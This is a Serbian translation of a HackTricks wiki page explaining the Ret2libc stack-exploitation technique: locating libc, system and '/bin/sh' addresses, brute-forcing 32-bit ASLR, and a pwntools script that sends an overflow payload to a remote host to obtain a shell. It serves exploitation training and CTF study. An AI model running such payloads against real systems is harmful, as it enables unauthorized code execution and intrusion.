# Ret2lib

{{#include ../../../../banners/hacktricks-training.md}}

## **Osnovne informacije**

Suština **Ret2Libc** je preusmeravanje toka izvršavanja ranjivog programa na funkciju unutar deljene biblioteke (npr., **system**, **execve**, **strcpy**) umesto izvršavanja shellcode-a koji je obezbedio napadač na steku. Napadač kreira payload koji menja adresu povratka na steku da pokazuje na željenu funkciju biblioteke, dok takođe obezbeđuje da su svi potrebni argumenti ispravno postavljeni prema konvenciji pozivanja.

### **Primer koraka (pojednostavljeno)**

- Dobiti adresu funkcije koju treba pozvati (npr. system) i komandu koju treba pozvati (npr. /bin/sh)
- Generisati ROP lanac da prosledi prvi argument koji pokazuje na string komande i tok izvršavanja funkciji

## Pronalaženje adresa

- Pretpostavljajući da je `libc` koji se koristi onaj sa trenutnog računara, možete pronaći gde će biti učitan u memoriji sa:
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
Ako želite da proverite da li ASLR menja adresu libc, možete uraditi:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
- Poznavanje korišćene libc takođe omogućava pronalaženje ofseta do `system` funkcije sa:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
- Poznavanje korišćene libc omogućava takođe pronalaženje ofseta do stringa `/bin/sh` funkcije sa:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Koristeći gdb-peda / GEF

Poznavajući korišćenu libc, takođe je moguće koristiti Peda ili GEF da dobijete adresu funkcije **system**, funkcije **exit** i stringa **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Korišćenje /proc/\<PID>/maps

Ako proces kreira **decu** svaki put kada razgovarate s njim (mrežni server), pokušajte da **pročitate** tu datoteku (verovatno će vam biti potrebna root privilegija).

Ovde možete pronaći **tačno gde je libc učitan** unutar procesa i **gde će biti učitan** za svaku decu procesa.

![](<../../../../images/image (95).png>)

U ovom slučaju, učitan je u **0xb75dc000** (Ovo će biti osnovna adresa libc)

## Nepoznata libc

Može biti moguće da **ne znate koju libc binarni fajl učitava** (jer se možda nalazi na serveru kojem nemate pristup). U tom slučaju, mogli biste iskoristiti ranjivost da **procurite neke adrese i otkrijete koja libc** biblioteka se koristi:

{{#ref}}
rop-leaking-libc-address/
{{#endref}}

I možete pronaći pwntools šablon za ovo u:

{{#ref}}
rop-leaking-libc-address/rop-leaking-libc-template.md
{{#endref}}

## Obilaženje ASLR-a u 32 bita

Ovi napadi brute-force su **samo korisni za 32-bitne sisteme**.

- Ako je exploit lokalni, možete pokušati da brute-force-ujete osnovnu adresu libc (korisno za 32-bitne sisteme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
- Ako napadate udaljeni server, možete pokušati da **brute-force-ujete adresu funkcije `libc` `usleep`**, prosledjujući kao argument 10 (na primer). Ako u nekom trenutku **serveru treba dodatnih 10s da odgovori**, pronašli ste adresu ove funkcije.

## One Gadget

{{#ref}}
../../one-gadget.md
{{#endref}}

## x86 Ret2lib Code Example

U ovom primeru ASLR brute-force je integrisan u kod, a ranjivi binarni fajl se nalazi na udaljenom serveru:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib primer

Proverite primer iz:

{{#ref}}
../rop-return-oriented-programing.md
{{#endref}}

## Ret-into-printf (ili puts)

Ovo omogućava **curenje informacija iz procesa** pozivajući `printf`/`puts` sa nekim specifičnim podacima postavljenim kao argument.

## Ret2printf

Ovo u suštini znači zloupotrebu **Ret2lib da se transformiše u ranjivost formata stringova `printf`** koristeći `ret2lib` da pozove printf sa vrednostima za eksploataciju (zvuči beskorisno, ali je moguće):

{{#ref}}
../../format-strings/
{{#endref}}

## Ostali primeri i reference

- [https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csaw19_babyboi/index.html)
- Ret2lib, dato curenje do adrese funkcije u libc, koristeći jedan gadget
- [https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/csawquals17_svc/index.html)
- 64 bita, ASLR omogućeno, ali bez PIE, prvi korak je popuniti overflow do bajta 0x00 kanarija da bi se zatim pozvao puts i curio. Sa kanarijom se kreira ROP gadget da pozove puts da curi adresu puts iz GOT-a i zatim ROP gadget da pozove `system('/bin/sh')`
- [https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/fb19_overfloat/index.html)
- 64 bita, ASLR omogućeno, bez kanarija, stack overflow u main iz funkcije deteta. ROP gadget da pozove puts da curi adresu puts iz GOT-a i zatim pozove jedan gadget.
- [https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html](https://guyinatuxedo.github.io/08-bof_dynamic/hs19_storytime/index.html)
- 64 bita, bez pie, bez kanarija, bez relro, nx. Koristi write funkciju da curi adresu write (libc) i poziva jedan gadget.

{{#include ../../../../banners/hacktricks-training.md}}
